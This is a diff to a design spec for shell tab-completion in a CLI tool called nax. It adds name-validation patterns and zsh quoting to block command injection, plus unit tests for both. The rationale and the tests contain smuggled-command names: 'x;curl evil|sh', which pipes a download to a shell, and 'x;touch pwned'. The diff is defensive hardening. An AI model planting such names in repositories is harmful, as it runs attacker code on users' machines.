@@ -37,7 +37,7 @@ export function listFeatureNames(startDir: string): Promise<string[]>;
 export function listProfileNames(startDir: string): Promise<string[]>;
 ```
 
-The project root is the parent of `findProjectDir(startDir)`. Feature names are every directory entry under the features directory except names starting with `.`; this follows `nax features list` (which lists every directory; skipping dot-directories is this feature's own choice) rather than `features resolve`'s candidate filter (directories holding `prd.json` or `spec.md`), because `nax plan -f <name>` names a feature before it has a `prd.json`. Outside a project, `listFeatureNames` returns `[]` and `listProfileNames` passes `startDir` to `listProfiles`, so only global profiles are found.
+The project root is the parent of `findProjectDir(startDir)`. Feature names are the directory entries under the features directory that `validateFeatureName` (`src/utils/feature-name.ts`, pattern `^[a-zA-Z0-9][a-zA-Z0-9._-]{0,127}$`) accepts, so dot-directories and any name `nax run` would reject are skipped; this is wider than `features resolve`'s candidate filter `features resolve`'s candidate filter (directories holding `prd.json` or `spec.md`), because `nax plan -f <name>` names a feature before it has a `prd.json`. Profile names are kept only when they match `^[A-Za-z0-9][A-Za-z0-9._-]*$`. **Why both filters:** a candidate is inserted into the user's command line as shell text, and a cloned repo can hold a directory or profile named like `x;curl evil|sh`; only names made of shell-inert characters are ever offered. Outside a project, `listFeatureNames` returns `[]` and `listProfileNames` passes `startDir` to `listProfiles`, so only global profiles are found.
 
 **Engine (US-002)** — `engine.ts`:
 
@@ -85,14 +85,14 @@ complete -o default -F _nax_complete nax
 
 Reading line by line (not `COMPREPLY=($(...))`) keeps a candidate from being glob-expanded; `mapfile` is avoided because macOS ships bash 3.2.
 
-The zsh script defines `_nax`, which runs `nax __complete -- "${(@)words[2,CURRENT]}" 2>/dev/null`, splits the output on newlines, drops empty lines, and passes the candidates to `compadd`; with no candidates it calls `_files`. It registers with `compdef _nax nax` when `compdef` is defined; when it is not (compinit not loaded) it prints a one-line hint to stderr containing `autoload -Uz compinit && compinit` and returns 0, rather than loading compinit itself (which writes `~/.zcompdump`). Worked skeleton:
+The zsh script defines `_nax`, which runs `nax __complete -- "${(@)words[2,CURRENT]}" 2>/dev/null`, splits the output on newlines, drops empty lines, and passes the candidates to `compadd` without `-Q`, so zsh quotes anything it inserts; with no candidates it calls `_files`. It registers with `compdef _nax nax` when `compdef` is defined; when it is not (compinit not loaded) it prints a one-line hint to stderr containing `autoload -Uz compinit && compinit` and returns 0, rather than loading compinit itself (which writes `~/.zcompdump`). Worked skeleton:
 
 ```zsh
 _nax() {
   local -a candidates
   candidates=("${(@f)$(nax __complete -- "${(@)words[2,CURRENT]}" 2>/dev/null)}")
   candidates=(${candidates:#})
-  if (( ${#candidates} )); then compadd -Q -- "${candidates[@]}"; else _files; fi
+  if (( ${#candidates} )); then compadd -- "${candidates[@]}"; else _files; fi
 }
 if (( $+functions[compdef] )); then
   compdef _nax nax
@@ -250,6 +250,8 @@ None. No story breaks an existing assertion. US-001 to US-003 only add new files
 8. [unit] `listProfileNames` for a temp directory outside any nax project resolves the global names only, `["g1", "shared"]`.
 9. [unit] `listProfileNames(<root>/src/deep)` resolves `["g1", "p1", "shared"]`.
 10. [unit] With `NAX_GLOBAL_CONFIG_DIR` pointing at a temp dir that has no `profiles/` directory, `listProfileNames(root)` resolves `["p1", "shared"]`.
+11. [unit] With a directory `.nax/features/x;touch pwned` added next to `alpha` and `beta`, `listFeatureNames(root)` still resolves `["alpha", "beta"]`.
+12. [unit] With a file `.nax/profiles/bad name$x.json` added to the project, `listProfileNames(root)` still resolves `["g1", "p1", "shared"]`.
 
 ### US-002
 
@@ -295,6 +297,7 @@ The ACs evaluate `completionScript(shell)` in a real shell process (`bash --norc
 11. [unit] In zsh, with the stub `nax` printing nothing, calling `_nax` calls `_files` once and does not call `compadd`.
 12. [unit] In zsh, with a stub `nax` that writes `boom` to stderr and prints `alpha`, calling `_nax` leaves the zsh process's stderr empty and passes `alpha` to `compadd`.
 13. [unit] `SUPPORTED_SHELLS` equals `["bash", "zsh"]`.
+14. [unit] In the zsh call of AC 9, the recorded `compadd` arguments do not include `-Q`.
 
 ### US-004
 
